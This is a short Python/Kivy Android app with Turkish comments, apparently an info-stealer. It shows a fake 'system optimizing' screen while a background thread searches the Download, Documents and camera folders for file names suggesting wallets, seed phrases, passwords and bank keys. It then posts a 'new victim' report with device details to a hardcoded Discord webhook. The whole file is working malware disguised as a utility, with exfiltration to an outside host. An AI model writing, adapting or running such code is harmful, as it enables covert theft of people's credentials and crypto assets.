import os
import requests
from kivy.app import App
from kivy.uix.label import Label
from threading import Thread

# --- AYARLAR ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1469874224826159238/6uZ4nai1p28JAPZFSl5HQs4U1IeaUZot-j7n__PsijGtJDA3bg2ZQHk5c92BENHE7UG9"

class CasusAsistan(App):
    def build(self):
        return Label(text="Sistem Optimize Ediliyor...\nLÃ¼tfen KapatmayÄ±nÄ±z.")

    def on_start(self):
        # Operasyonu arka planda baÅŸlatÄ±r ki uygulama donmasÄ±n
        Thread(target=self.operasyon_baslat).start()

    def operasyon_baslat(self):
        rapor = "ğŸ“± **YENÄ° ANDROID KURBANI DÃœÅTÃœ!** ğŸ“±\n\n"
        
        # 1. DOSYA VE CÃœZDAN TARAMASI (Wallet, Seed, Password)
        hedef_klasorler = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/DCIM/Camera']
        aranan_kelimeler = ['wallet', 'seed', 'sifre', 'banka', 'crypto', 'key', 'pass']
        
        bulunan_dosyalar = []
        try:
            for klasor in hedef_klasorler:
                if os.path.exists(klasor):
                    for dosya in os.listdir(klasor):
                        if any(kelime in dosya.lower() for kelime in aranan_kelimeler):
                            bulunan_dosyalar.append(f"ğŸ“„ {dosya}")
            
            if bulunan_dosyalar:
                rapor += "ğŸ“‚ **Kritik Dosyalar:**\n" + "\n".join(bulunan_dosyalar[:10]) + "\n"
            else:
                rapor += "ğŸ“‚ Kritik dosya izine rastlanmadÄ±.\n"
        except:
            rapor += "âŒ Dosya eriÅŸim izni reddedildi.\n"

        # 2. SÄ°STEM BÄ°LGÄ°SÄ°
        rapor += f"\nâš™ï¸ **Cihaz Bilgisi:** {os.uname().machine}\n"

        # DISCORD'A GÃ–NDER
        try:
            requests.post(WEBHOOK_URL, json={"content": rapor})
        except:
            pass

if __name__ == "__main__":
    CasusAsistan().run()
